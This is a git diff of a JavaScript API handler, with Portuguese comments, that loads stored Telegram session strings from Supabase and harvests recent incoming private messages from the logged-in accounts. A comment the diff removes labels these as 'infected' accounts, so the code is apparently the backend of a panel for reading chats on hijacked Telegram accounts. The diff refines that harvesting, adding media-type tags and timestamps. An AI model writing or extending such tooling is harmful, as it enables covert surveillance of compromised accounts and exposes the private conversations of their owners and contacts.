@@ -11,7 +11,6 @@ export default async function handler(req, res) {
   await authenticate(req, res, async () => {
     const { phone } = req.body;
 
-    // Busca a sessão
     const { data: sessionData } = await supabase
         .from('telegram_sessions')
         .select('session_string')
@@ -27,26 +26,32 @@ export default async function handler(req, res) {
     try {
         await client.connect();
 
-        // Pega os últimos 20 chats
-        const dialogs = await client.getDialogs({ limit: 20 });
-        
+        // Pega os últimos 15 diálogos apenas (para ser rápido)
+        const dialogs = await client.getDialogs({ limit: 15 });
         const replies = [];
         
         for (const d of dialogs) {
-            // Filtra: É usuário (não grupo) E a última mensagem NÃO fui eu que mandei (d.message.out === false)
+            // Filtra: É usuário E mensagem recebida (não enviada por mim)
             if (d.isUser && !d.isChannel && d.message && !d.message.out) {
-                // Opcional: Filtrar apenas respostas recentes (últimas 24h)
+                // Só mensagens das últimas 24h
                 const msgDate = new Date(d.message.date * 1000);
                 const isRecent = (new Date() - msgDate) < (24 * 60 * 60 * 1000);
 
                 if (isRecent) {
+                    let mediaType = 'text';
+                    if (d.message.media) {
+                        if (d.message.media.photo) mediaType = 'image';
+                        else if (d.message.media.document) mediaType = 'document/video';
+                    }
+
                     replies.push({
                         chatId: d.id.toString(),
                         name: d.title,
                         username: d.entity?.username ? `@${d.entity.username}` : null,
-                        lastMessage: d.message.message,
+                        lastMessage: d.message.message || `[${mediaType}]`,
                         date: msgDate.toLocaleString(),
-                        fromPhone: phone, // Em qual conta infectada chegou
+                        timestamp: msgDate.getTime(),
+                        fromPhone: phone,
                         unread: d.unreadCount > 0
                     });
                 }
